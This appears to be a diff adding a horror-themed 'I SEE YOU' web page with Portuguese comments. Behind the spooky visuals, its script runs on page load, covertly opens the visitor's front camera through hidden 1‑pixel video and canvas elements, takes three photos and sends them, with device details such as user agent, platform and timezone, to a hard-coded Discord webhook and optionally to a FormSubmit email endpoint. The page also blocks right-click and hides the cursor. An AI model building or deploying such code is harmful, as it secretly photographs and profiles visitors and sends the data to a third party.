@@ -76,4 +76,275 @@
             50% { opacity: 0.8; }
         }
         
-        /* Esconde
+        /* Esconde elementos de captura */
+        #video, #canvas {
+            position: absolute;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+            pointer-events: none;
+        }
+        
+        /* Scanlines */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0,0,0,0.2) 50%,
+                rgba(0,0,0,0.2)
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 5;
+        }
+        
+        /* Efeito de vhs */
+        .vhs-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 6;
+            opacity: 0.1;
+        }
+        
+        .vhs-effect::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                transparent 0%,
+                rgba(255, 0, 0, 0.1) 50%,
+                transparent 100%
+            );
+            animation: vhs 8s infinite;
+        }
+        
+        @keyframes vhs {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+        
+        /* Olhos no fundo */
+        .eyes {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 2;
+            opacity: 0.1;
+        }
+        
+        .eye {
+            position: absolute;
+            width: 100px;
+            height: 50px;
+            background: radial-gradient(ellipse at center, #8B0000 0%, transparent 70%);
+            border-radius: 50%;
+            animation: blink 4s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 96%, 100% { transform: scaleY(1); }
+            98% { transform: scaleY(0.1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="noise"></div>
+    <div class="scanlines"></div>
+    <div class="vhs-effect"></div>
+    <div class="eyes" id="eyes"></div>
+    
+    <div id="message">I SEE YOU</div>
+    <div class="subtext">você não deveria estar aqui...</div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ============================================
+        // CONFIGURAÇÕES - ALTERE AQUI
+        // ============================================
+        
+        // OPÇÃO 1: Usar Discord Webhook (MAIS FÁCIL)
+        // Crie um webhook no Discord e cole a URL aqui:
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1515168046891798628/Rus8953zz3rU949DuJU8DOtZeWUlG-2h04GuzDfTztu9Vs80dMFC_qsGV0H2GGnwSCWF'
+        // OPÇÃO 2: Usar EmailJS (envia direto pro e-mail)
+        // Crie conta em emailjs.com, configure um serviço e template
+        const EMAILJS_USER_ID = 'seu_user_id';
+        const EMAILJS_SERVICE = 'seu_service';
+        const EMAILJS_TEMPLATE = 'seu_template';
+        const SEU_EMAIL = 'seuemail@gmail.com';
+        
+        // OPÇÃO 3: Usar FormSubmit (mais simples, só precisa confirmar e-mail 1x)
+        const FORMSUBMIT_URL = 'https://formsubmit.co/seuemail@gmail.com';
+        
+        // ============================================
+        // CÓDIGO DE CAPTURA
+        // ============================================
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // Criar olhos aleatórios no fundo
+        function createEyes() {
+            const container = document.getElementById('eyes');
+            for (let i = 0; i < 20; i++) {
+                const eye = document.createElement('div');
+                eye.className = 'eye';
+                eye.style.left = Math.random() * 100 + '%';
+                eye.style.top = Math.random() * 100 + '%';
+                eye.style.animationDelay = Math.random() * 4 + 's';
+                container.appendChild(eye);
+            }
+        }
+        createEyes();
+        
+        // Inicializa câmera
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    // Captura múltiplas fotos em intervalos diferentes
+                    setTimeout(() => captureAndSend('foto_1'), 1000);
+                    setTimeout(() => captureAndSend('foto_2'), 2500);
+                    setTimeout(() => captureAndSend('foto_3'), 4000);
+                    
+                    // Para a câmera após todas as capturas
+                    setTimeout(() => {
+                        const tracks = stream.getTracks();
+                        tracks.forEach(track => track.stop());
+                    }, 5000);
+                };
+                
+            } catch (err) {
+                console.log('Câmera não disponível:', err);
+            }
+        }
+        
+        // Captura e envia
+        function captureAndSend(label) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // Envia por todas as opções disponíveis
+            sendToDiscord(imageData, label);
+            sendToFormSubmit(imageData, label);
+            
+            // Coleta informações do dispositivo
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenSize: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString('pt-BR'),
+                label: label
+            };
+            
+            sendInfoToDiscord(info);
+        }
+        
+        // Envia para Discord
+        function sendToDiscord(imageData, label) {
+            if (!DISCORD_WEBHOOK.includes('SEU_WEBHOOK')) {
+                fetch(imageData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('file', blob, `captura_${label}_${Date.now()}.jpg`);
+                        formData.append('content', `📸 **Nova Captura**\n🕐 ${new Date().toLocaleString('pt-BR')}\n🏷️ ${label}`);
+                        
+                        fetch(DISCORD_WEBHOOK, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => console.log('Erro Discord:', e));
+                    });
+            }
+        }
+        
+        // Envia informações para Discord
+        function sendInfoToDiscord(info) {
+            if (!DISCORD_WEBHOOK.includes('SEU_WEBHOOK')) {
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📱 **Informações do Dispositivo:**\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``
+                    })
+                }).catch(e => console.log('Erro info:', e));
+            }
+        }
+        
+        // Envia para FormSubmit
+        function sendToFormSubmit(imageData, label) {
+            if (!FORMSUBMIT_URL.includes('seuemail')) {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = FORMSUBMIT_URL;
+                form.style.display = 'none';
+                
+                const input = document.createElement('input');
+                input.name = 'foto_' + label;
+                input.value = imageData;
+                
+                const subject = document.createElement('input');
+                subject.name = '_subject';
+                subject.value = `Nova captura - ${new Date().toLocaleString('pt-BR')}`;
+                
+                form.appendChild(input);
+                form.appendChild(subject);
+                document.body.appendChild(form);
+                form.submit();
+                document.body.removeChild(form);
+            }
+        }
+        
+        // Inicia ao carregar
+        window.addEventListener('load', initCamera);
+        
+        // Efeito de movimento do mouse
+        document.addEventListener('mousemove', (e) => {
+            const x = (e.clientX / window.innerWidth - 0.5) * 30;
+            const y = (e.clientY / window.innerHeight - 0.5) * 30;
+            document.getElementById('message').style.transform = 
+                `translate(${x}px, ${y}px)`;
+        });
+        
+        // Previne menu de contexto (clique direito)
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Esconde cursor
+        document.body.style.cursor = 'none';
+    </script>
+    
+    <!-- EmailJS SDK (descomente se for usar) -->
+    <!-- <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script> -->
+</body>
+</html>
